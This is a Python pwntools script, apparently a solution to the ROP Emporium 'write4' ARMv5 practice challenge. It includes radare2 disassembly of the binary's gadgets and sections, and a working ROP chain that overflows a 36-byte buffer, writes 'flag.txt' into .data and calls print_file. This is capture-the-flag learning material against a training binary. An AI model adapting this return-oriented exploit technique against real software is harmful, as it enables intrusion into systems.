from pwn import *
context.binary = elf = ELF('write4_armv5')

'''
[0x000104c8]> s loc.usefulGadgets 
[0x000105ec]> pd 10
┌ 8: loc.usefulGadgets ();
│           0x000105ec      003084e5       str r3, [r4]
└           0x000105f0      1880bde8       pop {r3, r4, pc}
┌ 4: fcn.000105f4 ();
└           0x000105f4      0180bde8       pop {r0, pc}

[0x000105b4]> pdf @ sym.usefulFunction 
┌ 24: sym.usefulFunction ();
│           ; var int32_t var_4h @ sp+0x4
│           0x000105d0      00482de9       push {fp, lr}
│           0x000105d4      04b08de2       add fp, var_4h
│           0x000105d8      08009fe5       ldr r0, [str.nonexistent]   ; [0x10668:4]=0x656e6f6e ; "nonexistent"
│           0x000105dc      b3ffffeb       bl sym.imp.print_file
│           0x000105e0      0000a0e1       mov r0, r0                  ; 0x10668 ; "nonexistent"
└           0x000105e4      0088bde8       pop {fp, pc}

[0x000105b4]> rabin2 -S write4_armv5
[Sections]

nth paddr        size vaddr       vsize perm name
―――――――――――――――――――――――――――――――――――――――――――――――――
18  0x00000f00    0x4 0x00020f00    0x4 -rw- .init_array
19  0x00000f04    0x4 0x00020f04    0x4 -rw- .fini_array
20  0x00000f08   0xf8 0x00020f08   0xf8 -rw- .dynamic
21  0x00001000   0x24 0x00021000   0x24 -rw- .got
22  0x00001024    0x8 0x00021024    0x8 -rw- .data
23  0x0000102c    0x0 0x0002102c    0x4 -rw- .bss

[0x00010478]> s sym.imp.print_file 
[0x000104b0]> pdf
            ; CALL XREF from sym.usefulFunction @ 0x105dc
┌ 12: sym.imp.print_file ();
│           0x000104b0      00c68fe2       add ip, pc, 0, 12
│           0x000104b4      10ca8ce2       add ip, ip, 16, 20
│           ; DATA XREF from sym.imp.print_file @ 0x104b0
└           0x000104b8      60fbbce5       ldr pc, [ip, 0xb60]!        ; 0x21018 ; "x\x04\x01"


'''

offset = 36
str_r3_ptrr4_pop_r3_r4_pc = 0x000105ec
pop_r3_r4_pc              = 0x000105f0
pop_r0_pc                 = 0x000105f4

print_file = 0x000104b0

where = 0x00021024
what1 = unpack(b'flag')
what2 = unpack(b'.txt')

payload  = b'A'*offset 
payload += p32(pop_r3_r4_pc)              + p32(what1) + p32(where)
payload += p32(str_r3_ptrr4_pop_r3_r4_pc) + p32(what2) + p32(where+4)
payload += p32(str_r3_ptrr4_pop_r3_r4_pc) + p32(0x0)   + p32(0x0)
payload += p32(pop_r0_pc)                 + p32(where) 
payload += p32(print_file)


p = elf.process()

#p = gdb.debug(elf.path)


p.recv()
p.sendline(payload)
log.info(p.recvall())




